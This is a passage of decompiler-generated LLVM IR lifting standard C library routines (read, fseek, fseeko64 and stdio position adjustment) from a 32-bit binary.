  %v2_118d4 = inttoptr i32 %v1_118d4 to i8*
  %v3_118d4 = load i8, i8* %v2_118d4, align 1
  %v4_118d4 = zext i8 %v3_118d4 to i32
  %v9_118d8 = icmp eq i32 %v4_118d4, %v1_11810
  br i1 %v9_118d8, label %bb20, label %dec_label_pc_118d0

bb20:                                             ; preds = %dec_label_pc_118d4
  store i32 %v3_1180c, i32* @r4, align 4
  ret i32 %v1_118d4

dec_label_pc_118d0:                               ; preds = %dec_label_pc_1183c, %.backedge.backedge, %dec_label_pc_118d4
  %v0_118d4 = phi i32 [ %v1_118d4, %dec_label_pc_118d4 ], [ %v0_118d411, %dec_label_pc_1183c ], [ %v1_11848, %.backedge.backedge ]
  %v0_118e0 = phi i32 [ %v1_118e0, %dec_label_pc_118d4 ], [ %v0_118c07, %dec_label_pc_1183c ], [ %v1_11864, %.backedge.backedge ]
  %v2_118e0 = icmp eq i32 %v0_118e0, 0
  br i1 %v2_118e0, label %dec_label_pc_118e8, label %dec_label_pc_118d4

dec_label_pc_118e8:                               ; preds = %dec_label_pc_118d0
  store i32 %v3_1180c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_118e0, { 1, 0 }
  uselistorder i32 %v1_11864, { 1, 0, 2 }
  uselistorder i32 %v1_11848, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_1184850, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1183c, { 1, 0 }
  uselistorder i32 %v0_118c07, { 1, 2, 0 }
  uselistorder i32 %v0_1181c, { 1, 0, 2 }
  uselistorder i32 %v1_1181c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_11814, { 1, 0 }
  uselistorder i32 %v1_11810, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_1180c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 2130640639, { 0, 1, 4, 2, 3 }
  uselistorder i32 -2130640640, { 6, 2, 0, 7, 3, 1, 8, 4, 5 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_118d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11848, { 1, 0 }
  uselistorder label %dec_label_pc_1183c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11834, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_118f8 = load i32, i32* @r4, align 4
  store i32 %v3_118f8, i32* %stack_var_-8, align 4
  %v1_118fc = load i32, i32* @r1, align 4
  %v2_118fc = inttoptr i32 %v1_118fc to i32*
  %v3_118fc = load i32, i32* @r2, align 4
  %v4_118fc = call i32 @read(i32 %arg1, i32* %v2_118fc, i32 %v3_118fc)
  store i32 %v4_118fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_118fc, -4095
  br i1 %tmp, label %dec_label_pc_1191c, label %dec_label_pc_1190c

dec_label_pc_1190c:                               ; preds = %entry
  %v0_1190c = call i32 @__errno_location()
  %v0_11910 = load i32, i32* %r4.global-to-local, align 4
  %v1_11910 = sub i32 0, %v0_11910
  %v2_11914 = inttoptr i32 %v0_1190c to i32*
  store i32 %v1_11910, i32* %v2_11914, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1191c

dec_label_pc_1191c:                               ; preds = %entry, %dec_label_pc_1190c
  %v0_1191c = phi i32 [ %v4_118fc, %entry ], [ -1, %dec_label_pc_1190c ]
  %v2_11920 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11920, i32* @r4, align 4
  ret i32 %v0_1191c

; uselistorder directives
  uselistorder i32 %v4_118fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1191c, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_11924 = load i32, i32* @r2, align 4
  store i32 %v0_11924, i32* @r3, align 4
  %v0_1192c = call i32 @__GI_fseeko64()
  ret i32 %v0_1192c

; uselistorder directives
  uselistorder i32* @r2, { 16, 13, 6, 17, 18, 2, 19, 20, 21, 46, 11, 22, 47, 48, 9, 49, 50, 23, 24, 25, 12, 26, 27, 28, 29, 8, 30, 31, 3, 32, 0, 33, 51, 52, 7, 34, 35, 53, 54, 10, 36, 37, 38, 55, 56, 57, 87, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 42, 88, 89, 90, 91, 39, 92, 93, 14, 94, 4, 95, 99, 100, 103, 96, 43, 44, 97, 71, 75, 76, 79, 77, 78, 72, 73, 74, 68, 45, 1, 101, 5, 102, 15, 98, 40, 41, 69, 70, 80, 81, 82, 83, 84, 85, 86 }
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_11930 = load i32, i32* @r4, align 4
  %v6_11930 = load i32, i32* @r5, align 4
  %v9_11930 = load i32, i32* @r6, align 4
  %v0_11934 = load i32, i32* @r3, align 4
  %v2_11938 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_11934, i32* @r6, align 4
  %v0_11940 = load i32, i32* @r0, align 4
  store i32 %v0_11940, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11934, 3
  br i1 %tmp, label %dec_label_pc_1195c, label %dec_label_pc_11948

dec_label_pc_11948:                               ; preds = %entry
  %v0_11948 = call i32 @__errno_location()
  store i32 %v0_11948, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_11954 = inttoptr i32 %v0_11948 to i32*
  store i32 22, i32* %v2_11954, align 4
  br label %.thread3

dec_label_pc_1195c:                               ; preds = %entry
  %v1_1195c = add i32 %v0_11940, 52
  %v2_1195c = inttoptr i32 %v1_1195c to i32*
  %v3_1195c = load i32, i32* %v2_1195c, align 4
  store i32 %v3_1195c, i32* %r7.global-to-local, align 4
  %v2_11960 = icmp eq i32 %v3_1195c, 0
  %v0_11964 = load i32, i32* @r1, align 4
  store i32 %v0_11964, i32* %stack_var_-28, align 4
  br i1 %v2_11960, label %dec_label_pc_11970, label %dec_label_pc_1199c

dec_label_pc_11970:                               ; preds = %dec_label_pc_1195c
  %v1_11970 = add i32 %v0_11940, 56
  store i32 %v1_11970, i32* @r4, align 4
  store i32 49340, i32* %r3.global-to-local, align 4
  store i32 %v2_11938, i32* @r0, align 4
  store i32 %v1_11970, i32* %r2.global-to-local, align 4
  %v1_11988 = call i32 @__pthread_return_void()
  %v0_1198c = load i32, i32* @r4, align 4
  store i32 %v0_1198c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_c0b4.90 to i32), i32* %r3.global-to-local, align 4
  store i32 72092, i32* @lr, align 4
  %v1_11998 = call i32 @__pthread_return_0()
  store i32 %v1_11998, i32* %r0.global-to-local, align 4
  %v0_1199c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1199c

dec_label_pc_1199c:                               ; preds = %dec_label_pc_1195c, %dec_label_pc_11970
  %v0_119a8 = phi i32 [ %v0_11940, %dec_label_pc_1195c ], [ %v0_1199c.pre, %dec_label_pc_11970 ]
  %v1_1199c = inttoptr i32 %v0_119a8 to i8*
  %v2_1199c = load i8, i8* %v1_1199c, align 1
  %v3_1199c = zext i8 %v2_1199c to i32
  store i32 %v3_1199c, i32* %r3.global-to-local, align 4
  %v1_119a0 = and i32 %v3_1199c, 64
  %v2_119a0 = icmp eq i32 %v1_119a0, 0
  br i1 %v2_119a0, label %dec_label_pc_119b8, label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %dec_label_pc_1199c
  store i32 %v0_119a8, i32* @r0, align 4
  %v0_119ac = call i32 @__stdio_wcommit()
  store i32 %v0_119ac, i32* %r0.global-to-local, align 4
  %v2_119b0 = icmp eq i32 %v0_119ac, 0
  br i1 %v2_119b0, label %dec_label_pc_119b8, label %dec_label_pc_11a28

dec_label_pc_119b8:                               ; preds = %dec_label_pc_119a8, %dec_label_pc_1199c
  %v0_119b8 = load i32, i32* @r6, align 4
  %v7_119b8 = icmp eq i32 %v0_119b8, 1
  br i1 %v7_119b8, label %dec_label_pc_119c0, label %dec_label_pc_119b8.dec_label_pc_119d4_crit_edge

dec_label_pc_119b8.dec_label_pc_119d4_crit_edge:  ; preds = %dec_label_pc_119b8
  br label %dec_label_pc_119d4

dec_label_pc_119c0:                               ; preds = %dec_label_pc_119b8
  %v0_119c0 = load i32, i32* @r5, align 4
  store i32 %v0_119c0, i32* %r0.global-to-local, align 4
  %v2_119c4 = ptrtoint i32* %stack_var_-28 to i32
  %v2_119c8 = inttoptr i32 %v0_119c0 to i8*
  %v3_119c8 = call i32 @__stdio_adjust_position(i8* %v2_119c8, i32 %v2_119c4)
  store i32 %v3_119c8, i32* %r0.global-to-local, align 4
  %v1_119cc = icmp slt i32 %v3_119c8, 0
  br i1 %v1_119cc, label %dec_label_pc_11a28, label %dec_label_pc_119c0.dec_label_pc_119d4_crit_edge

dec_label_pc_119c0.dec_label_pc_119d4_crit_edge:  ; preds = %dec_label_pc_119c0
  %v0_119d4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_119d4

dec_label_pc_119d4:                               ; preds = %dec_label_pc_119b8.dec_label_pc_119d4_crit_edge, %dec_label_pc_119c0.dec_label_pc_119d4_crit_edge
  %v0_119d4 = phi i32 [ %v0_119b8, %dec_label_pc_119b8.dec_label_pc_119d4_crit_edge ], [ %v0_119d4.pre, %dec_label_pc_119c0.dec_label_pc_119d4_crit_edge ]
  store i32 %v0_119d4, i32* %r2.global-to-local, align 4
  %v0_119d8 = load i32, i32* @r5, align 4
  store i32 %v0_119d8, i32* %r0.global-to-local, align 4
  %v4_119e0 = call i32 @__stdio_seek(i32 %v0_119d8, i32* nonnull %stack_var_-28, i32 %v0_119d4)
  store i32 %v4_119e0, i32* %r0.global-to-local, align 4
  %v1_119e4 = icmp slt i32 %v4_119e0, 0
  br i1 %v1_119e4, label %dec_label_pc_11a28, label %dec_label_pc_119ec

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119d4
  %v0_119ec = load i32, i32* @r5, align 4
  %v1_119ec = inttoptr i32 %v0_119ec to i32*
  %v2_119ec = load i32, i32* %v1_119ec, align 4
  store i32 %v2_119ec, i32* %r3.global-to-local, align 4
  %v1_119f0 = add i32 %v0_119ec, 8
  %v2_119f0 = inttoptr i32 %v1_119f0 to i32*
  %v3_119f0 = load i32, i32* %v2_119f0, align 4
  store i32 %v3_119f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_119f8 = and i32 %v2_119ec, -72
  store i32 %v1_119f8, i32* %r3.global-to-local, align 4
  %v3_119fc = sdiv i32 %v2_119ec, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_11a04 = trunc i32 %v3_119fc to i8
  %v3_11a04 = add i32 %v0_119ec, 1
  %v4_11a04 = inttoptr i32 %v3_11a04 to i8*
  store i8 %v1_11a04, i8* %v4_11a04, align 1
  %v0_11a08 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a08 = load i32, i32* @r5, align 4
  %v2_11a08 = add i32 %v1_11a08, 28
  %v3_11a08 = inttoptr i32 %v2_11a08 to i32*
  store i32 %v0_11a08, i32* %v3_11a08, align 4
  %v0_11a0c = load i32, i32* %r0.global-to-local, align 4
  %v1_11a0c = trunc i32 %v0_11a0c to i8
  %v2_11a0c = load i32, i32* @r5, align 4
  %v3_11a0c = add i32 %v2_11a0c, 2
  %v4_11a0c = inttoptr i32 %v3_11a0c to i8*
  store i8 %v1_11a0c, i8* %v4_11a0c, align 1
  %v0_11a10 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a10 = trunc i32 %v0_11a10 to i8
  %v2_11a10 = load i32, i32* @r5, align 4
  %v3_11a10 = inttoptr i32 %v2_11a10 to i8*
  store i8 %v1_11a10, i8* %v3_11a10, align 1
  %v0_11a14 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a14 = load i32, i32* @r5, align 4
  %v2_11a14 = add i32 %v1_11a14, 16
  %v3_11a14 = inttoptr i32 %v2_11a14 to i32*
  store i32 %v0_11a14, i32* %v3_11a14, align 4
  %v0_11a18 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a18 = load i32, i32* @r5, align 4
  %v2_11a18 = add i32 %v1_11a18, 20
  %v3_11a18 = inttoptr i32 %v2_11a18 to i32*
  store i32 %v0_11a18, i32* %v3_11a18, align 4
  %v0_11a1c = load i32, i32* %r2.global-to-local, align 4
  %v1_11a1c = load i32, i32* @r5, align 4
  %v2_11a1c = add i32 %v1_11a1c, 24
  %v3_11a1c = inttoptr i32 %v2_11a1c to i32*
  store i32 %v0_11a1c, i32* %v3_11a1c, align 4
  %v0_11a20 = load i32, i32* %r0.global-to-local, align 4
  %v1_11a20 = load i32, i32* @r5, align 4
  %v2_11a20 = add i32 %v1_11a20, 44
  %v3_11a20 = inttoptr i32 %v2_11a20 to i32*
  store i32 %v0_11a20, i32* %v3_11a20, align 4
  br label %dec_label_pc_11a2c

dec_label_pc_11a28:                               ; preds = %dec_label_pc_119a8, %dec_label_pc_119d4, %dec_label_pc_119c0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11a2c

dec_label_pc_11a2c:                               ; preds = %dec_label_pc_119ec, %dec_label_pc_11a28
  %v0_11a2c = load i32, i32* %r7.global-to-local, align 4
  %v2_11a2c = icmp eq i32 %v0_11a2c, 0
  br i1 %v2_11a2c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_11a2c
  store i32 %v2_11938, i32* %r0.global-to-local, align 4
  store i32 49340, i32* %r3.global-to-local, align 4
  store i32 72260, i32* @lr, align 4
  call void @__pseudo_branch(i32 49340)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_11a2c, %dec_label_pc_11948, %bb
  %v0_11a44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11a44, i32* %r0.global-to-local, align 4
  store i32 %v3_11930, i32* @r4, align 4
  store i32 %v6_11930, i32* @r5, align 4
  store i32 %v9_11930, i32* @r6, align 4
  ret i32 %v0_11a44

; uselistorder directives
  uselistorder i32 %v0_119d4, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 9, 8, 11, 0, 10, 12 }
  uselistorder i32 24, { 2, 3, 13, 14, 15, 4, 5, 6, 7, 8, 9, 16, 17, 18, 19, 10, 20, 21, 22, 0, 11, 23, 12, 1 }
  uselistorder i32 28, { 7, 8, 17, 9, 10, 11, 12, 13, 14, 0, 15, 18, 3, 4, 5, 19, 20, 16, 21, 25, 22, 24, 6, 23, 1, 2 }
  uselistorder i32 -72, { 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 4, 3, 1, 0 }
  uselistorder i32 ()* @__pthread_return_0, { 39, 34, 33, 32, 31, 30, 29, 38, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 4, 16, 37, 36, 35, 2, 1, 3, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 15 }
  uselistorder i32 ptrtoint (i8* @global_var_c0b4.90 to i32), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__pthread_return_void, { 46, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 1, 0, 5, 4, 45, 44, 43, 42, 41, 40, 3, 2 }
  uselistorder i32 49340, { 0, 3, 4, 1, 5, 6, 7, 2, 8, 9, 10 }
  uselistorder i32 56, { 1, 3, 4, 5, 2, 0, 6, 7 }
  uselistorder i32* @r1, { 20, 18, 21, 22, 23, 24, 25, 26, 27, 49, 50, 28, 29, 16, 51, 52, 1, 53, 54, 30, 31, 32, 9, 33, 55, 56, 34, 35, 36, 0, 37, 38, 39, 10, 40, 41, 57, 60, 58, 59, 11, 12, 42, 61, 62, 100, 101, 102, 63, 64, 65, 66, 67, 68, 3, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 4, 43, 44, 82, 83, 84, 85, 86, 5, 14, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 7, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 6, 149, 150, 13, 19, 151, 2, 152, 45, 46, 89, 94, 95, 98, 96, 97, 90, 91, 92, 93, 87, 88, 17, 8, 15, 47, 48, 99 }
  uselistorder i32 52, { 0, 2, 1, 3, 4 }
  uselistorder i32 22, { 1, 7, 8, 2, 9, 0, 11, 3, 4, 10, 5, 6, 12 }
  uselistorder i32* @r3, { 1, 2, 3, 4, 5, 6, 11, 0, 7, 8, 12, 13, 14, 15, 16, 9, 10, 17, 20, 18, 19, 21 }
  uselistorder i32* @r6, { 16, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 1, 33, 34, 35, 36, 37, 38, 39, 75, 76, 77, 78, 79, 80, 2, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 13, 14, 15, 51, 52, 53, 54, 81, 82, 83, 84, 85, 86, 10, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 4, 3, 65, 66, 67, 68, 69, 105, 5, 106, 107, 108, 115, 116, 117, 118, 119, 120, 121, 122, 123, 6, 11, 124, 125, 7, 126, 127, 171, 172, 173, 174, 12, 128, 129, 130, 131, 8, 132, 133, 134, 135, 136, 138, 137, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 175, 176, 70, 71, 72, 153, 154, 155, 156, 73, 74, 165, 166, 167, 157, 158, 9, 159, 160, 161, 162, 163, 164, 109, 110, 111, 112, 113, 114, 168, 169, 170 }
  uselistorder i32* @r5, { 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 8, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 53, 54, 55, 56, 57, 128, 129, 130, 131, 132, 133, 134, 9, 135, 136, 58, 10, 59, 60, 61, 241, 242, 62, 11, 63, 64, 65, 66, 67, 68, 69, 25, 70, 71, 12, 72, 73, 74, 75, 76, 77, 23, 78, 79, 80, 81, 26, 85, 13, 86, 87, 88, 89, 90, 91, 92, 93, 5, 94, 95, 96, 97, 98, 99, 28, 29, 82, 1, 83, 84, 100, 101, 102, 103, 104, 105, 137, 138, 139, 140, 141, 6, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 27, 106, 14, 3, 107, 158, 168, 159, 160, 161, 21, 173, 169, 170, 171, 172, 243, 244, 245, 246, 174, 175, 176, 15, 177, 178, 179, 16, 180, 181, 182, 183, 184, 109, 108, 22, 247, 248, 185, 186, 187, 188, 17, 189, 190, 191, 192, 193, 18, 195, 194, 4, 196, 19, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 211, 210, 24, 212, 122, 123, 124, 125, 126, 127, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 2, 265, 266, 267, 110, 111, 112, 113, 114, 115, 116, 213, 20, 7, 214, 117, 118, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 119, 120, 121, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 162, 163, 164, 165, 166, 167, 268, 238, 239, 240 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a2c, { 1, 0 }
  uselistorder label %dec_label_pc_11a28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_119d4, { 1, 0 }
  uselistorder label %dec_label_pc_1199c, { 1, 0 }
}

define i32 @__stdio_adjust_position(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_11a60 = load i32, i32* @r4, align 4
  store i32 %v3_11a60, i32* %stack_var_-16, align 4
  %v2_11a64 = add i32 %tmp, 1
  %v3_11a64 = inttoptr i32 %v2_11a64 to i8*
  %v4_11a64 = load i8, i8* %v3_11a64, align 1
  %v5_11a64 = zext i8 %v4_11a64 to i32
  %v3_11a68 = load i8, i8* %arg1, align 1
  %v4_11a68 = zext i8 %v3_11a68 to i32
  store i32 %v4_11a68, i32* %r2.global-to-local, align 4
  %v4_11a6c = mul nuw nsw i32 %v5_11a64, 256
  %v5_11a6c = or i32 %v4_11a68, %v4_11a6c
  store i32 %v5_11a6c, i32* @lr, align 4
  %tmp15 = urem i8 %v3_11a68, 4
  %v2_11a70 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_11a70, label %bb, label %dec_label_pc_11a80

bb:                                               ; preds = %entry
  br label %.thread

dec_label_pc_11a80:                               ; preds = %entry
  %v1_11a70 = zext i8 %tmp15 to i32
  %v1_11a80 = add nsw i32 %v1_11a70, -1
  %v7_11a80 = icmp eq i8 %tmp15, 1
  br i1 %v7_11a80, label %.thread, label %dec_label_pc_11a88

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a80
  %v1_11a88 = and i32 %v4_11a6c, 2048
  %v2_11a88 = icmp eq i32 %v1_11a88, 0
  br i1 %v2_11a88, label %.thread, label %dec_label_pc_11a90

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a88
  %v8_11a94 = icmp sgt i32 %v1_11a80, 1
  br i1 %v8_11a94, label %dec_label_pc_11b20, label %dec_label_pc_11a98

dec_label_pc_11a98:                               ; preds = %dec_label_pc_11a90
  %v2_11a98 = add i32 %tmp, 40
  %v3_11a98 = inttoptr i32 %v2_11a98 to i32*
  %v4_11a98 = load i32, i32* %v3_11a98, align 4
  %v2_11a9c = icmp eq i32 %v4_11a98, 0
  br i1 %v2_11a9c, label %dec_label_pc_11aa4, label %dec_label_pc_11b20

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11a98
  %v2_11aa4 = add i32 %tmp, 3
  %v3_11aa4 = inttoptr i32 %v2_11aa4 to i8*
  %v4_11aa4 = load i8, i8* %v3_11aa4, align 1
  %v5_11aa4 = zext i8 %v4_11aa4 to i32
  %v2_11aa8 = add i32 %tmp, 44
  %v3_11aa8 = inttoptr i32 %v2_11aa8 to i32*
  %v4_11aa8 = load i32, i32* %v3_11aa8, align 4
  store i32 %v4_11aa8, i32* %r2.global-to-local, align 4
  %v2_11aac = sub nsw i32 %v1_11a80, %v5_11aa4
  %v1_11ab4 = add nsw i32 %v2_11aac, -1
  %tmp11 = icmp slt i32 %v4_11aa8, 1
  br i1 %tmp11, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_11aa4
  %v7_11ab8 = add i32 %tmp, 2
  %v8_11ab8 = inttoptr i32 %v7_11ab8 to i8*
  %v9_11ab8 = load i8, i8* %v8_11ab8, align 1
  %v10_11ab8 = zext i8 %v9_11ab8 to i32
  %v7_11abc = sub nsw i32 %v1_11ab4, %v10_11ab8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11aa4, %bb, %dec_label_pc_11a88, %dec_label_pc_11a80, %bb12
  %v0_11ad8 = phi i32 [ %v1_11a80, %dec_label_pc_11a88 ], [ %v1_11a80, %dec_label_pc_11a80 ], [ 0, %bb ], [ %v7_11abc, %bb12 ], [ %v1_11ab4, %dec_label_pc_11aa4 ]
  %v1_11ac0 = and i32 %v4_11a68, 64
  %v2_11ac0 = icmp eq i32 %v1_11ac0, 0
  %storemerge.in.in.v = select i1 %v2_11ac0, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_11acc = add i32 %tmp, 16
  %v3_11acc = inttoptr i32 %v2_11acc to i32*
  %v4_11acc = load i32, i32* %v3_11acc, align 4
  %v2_11ad0 = sub i32 %storemerge, %v4_11acc
  %v1_11ad4 = inttoptr i32 %arg2 to i32*
  %v2_11ad4 = load i32, i32* %v1_11ad4, align 4
  store i32 %v2_11ad4, i32* %r1.global-to-local, align 4
  %v3_11ad4 = add i32 %arg2, 4
  %v4_11ad4 = inttoptr i32 %v3_11ad4 to i32*
  %v5_11ad4 = load i32, i32* %v4_11ad4, align 4
  store i32 %v5_11ad4, i32* %r2.global-to-local, align 4
  %v2_11ad8 = add i32 %v2_11ad0, %v0_11ad8
  store i32 %v2_11ad8, i32* %r5.global-to-local, align 4
  %v2_11adc = sub i32 %v2_11ad4, %v2_11ad8
  %v2_11ae0 = and i32 %v2_11ad8, 1073741824
  %v3_11ae0 = icmp ne i32 %v2_11ae0, 0
  %v6_11ae0 = icmp eq i1 %v3_11ae0, false
  %tmp16 = icmp slt i32 %v2_11ad8, 0
  %v4_11ae0.neg = zext i1 %tmp16 to i32
  %v7_11ae0 = add i32 %v5_11ad4, %v4_11ae0.neg
  %v9_11ae0 = sext i1 %v6_11ae0 to i32
  %v10_11ae0 = add i32 %v7_11ae0, %v9_11ae0
  store i32 %v10_11ae0, i32* %r4.global-to-local, align 4
  store i32 %v2_11adc, i32* %v1_11ad4, align 4
  %v5_11ae4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_11ae4, i32* %v4_11ad4, align 4
  %v0_11ae8 = load i32, i32* %r6.global-to-local, align 4
  %v1_11ae8 = add i32 %v0_11ae8, 4
  %v2_11ae8 = inttoptr i32 %v1_11ae8 to i32*
  %v3_11ae8 = load i32, i32* %v2_11ae8, align 4
  %v1_11aec = load i32, i32* %r2.global-to-local, align 4
  %v8_11af0 = icmp sgt i32 %v3_11ae8, %v1_11aec
  br i1 %v8_11af0, label %dec_label_pc_11b04, label %dec_label_pc_11af4

dec_label_pc_11af4:                               ; preds = %.thread
  %v9_11aec = icmp eq i32 %v3_11ae8, %v1_11aec
  br i1 %v9_11aec, label %dec_label_pc_11af8, label %dec_label_pc_11b08thread-pre-split

dec_label_pc_11af8:                               ; preds = %dec_label_pc_11af4
  %v1_11af8 = inttoptr i32 %v0_11ae8 to i32*
  %v2_11af8 = load i32, i32* %v1_11af8, align 4
  %v1_11afc = load i32, i32* %r1.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v2_11af8, %v1_11afc
  br i1 %tmp17, label %dec_label_pc_11b04, label %dec_label_pc_11b08thread-pre-split

dec_label_pc_11b04:                               ; preds = %dec_label_pc_11af8, %.thread
  %v0_11b04 = load i32, i32* %r5.global-to-local, align 4
  %v1_11b04 = sub i32 0, %v0_11b04
  store i32 %v1_11b04, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11b08

dec_label_pc_11b08thread-pre-split:               ; preds = %dec_label_pc_11af8, %dec_label_pc_11af4
  %v0_11b08.pr = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11b08

dec_label_pc_11b08:                               ; preds = %dec_label_pc_11b08thread-pre-split, %dec_label_pc_11b04
  %v0_11b08 = phi i32 [ %v0_11b08.pr, %dec_label_pc_11b08thread-pre-split ], [ %v1_11b04, %dec_label_pc_11b04 ]
  %v1_11b08 = icmp slt i32 %v0_11b08, 0
  br i1 %v1_11b08, label %dec_label_pc_11b10, label %dec_label_pc_11b24

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11b08
  %v0_11b10 = call i32 @__errno_location()
  %v2_11b18 = inttoptr i32 %v0_11b10 to i32*
  store i32 75, i32* %v2_11b18, align 4
  %v0_11b24.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11b24

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11a98, %dec_label_pc_11a90
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11b24

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11b08, %dec_label_pc_11b10, %dec_label_pc_11b20
  %v0_11b24 = phi i32 [ %v0_11b08, %dec_label_pc_11b08 ], [ %v0_11b24.pre, %dec_label_pc_11b10 ], [ -1, %dec_label_pc_11b20 ]
  %v2_11b28 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11b28, i32* @r4, align 4
  ret i32 %v0_11b24

; uselistorder directives
  uselistorder i32 %v1_11aec, { 1, 0 }
  uselistorder i32 %v3_11ae8, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i8 %tmp15, { 0, 2, 1 }
  uselistorder i32 %v4_11a68, { 1, 0, 2 }
  uselistorder i32 %tmp, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
